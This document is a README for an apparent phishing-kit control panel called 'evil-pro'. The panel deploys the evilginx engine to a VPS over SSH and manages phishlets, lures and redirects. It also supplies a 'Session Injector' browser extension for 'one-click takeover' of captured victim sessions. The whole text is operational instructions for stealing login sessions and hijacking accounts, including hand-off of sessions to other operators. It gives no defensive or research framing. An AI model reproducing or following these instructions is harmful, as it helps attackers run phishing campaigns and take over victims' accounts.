# evil-pro Control Panel — portable

Everything is in this folder. Copy the whole folder to any computer and run it.

## Windows

1. Double-click **START.bat**
2. First run asks for a **listen address**, **username** and **password**
   - press Enter to accept the default `127.0.0.1:8080` (this computer only)
   - set a password (otherwise the panel is open to anyone who can reach it)
3. Your browser opens the panel automatically

## Linux / macOS

```bash
chmod +x START.sh SETUP.sh evilpro-panel-linux   # or evilpro-panel-mac
./START.sh
```

## Change the port later

Either run **SETUP.bat** again, or click **Settings → Panel login & port** inside
the panel and press **Restart panel**. If the port is already taken the panel
automatically moves to the next free one and prints it.

## What the files are

| File | Purpose |
|---|---|
| `evilpro-panel*.exe` | the panel itself |
| `evilginx-linux` / `evilginx-linux-arm64` | the engine it uploads to your VPS |
| `phishlets/` | phishlets deployed with the engine |
| `extension/` | Session Injector — hand this to whoever views sessions |
| `panel.json` | your settings + saved servers (**contains passwords, keep it safe**) |
| `START.bat` / `SETUP.bat` | run / reconfigure |

## Using it

1. **Add server** → VPS IP, SSH port, root user, password (or SSH key), domain, phishlet
2. **Test connection**, then **Install** — the panel SSHes in, installs the engine,
   writes config, opens the firewall, starts the service and verifies it
3. **Manage** → phishlets, lures, autolures, redirects, blacklist, settings, logs
4. **Hand-off** → gives you the Dashboard link + login + extension to send a user

The Dashboard (what the end user opens) shows sessions only and works with the
Session Injector extension for one-click takeover.

## The Session Injector extension

Load `extension/` once via `chrome://extensions` → **Developer mode** → **Load
unpacked**. It opens a captured session in a **separate, isolated window** so your
own logins are never overwritten — close the window and the victim session is gone.

Only one victim is live in that window at a time; taking over another replaces it
cleanly. Need two at once? Use the "Use this profile instead" button, or start a
second Chrome with its own profile: `chrome --user-data-dir=/tmp/victim2`.

## Hosting it on a server later

Run with an external bind and a password:

```bat
evilpro-panel.exe -bind 0.0.0.0:8080 -user admin -pass "something-strong"
```

TLS is supported with `-tls-cert` / `-tls-key` (e.g. behind Caddy or nginx).

## Requirements

- Engine deploys to Ubuntu 20.04–24.04 (Debian too), amd64 or arm64
- Nothing to install on this computer — the panel is a single binary
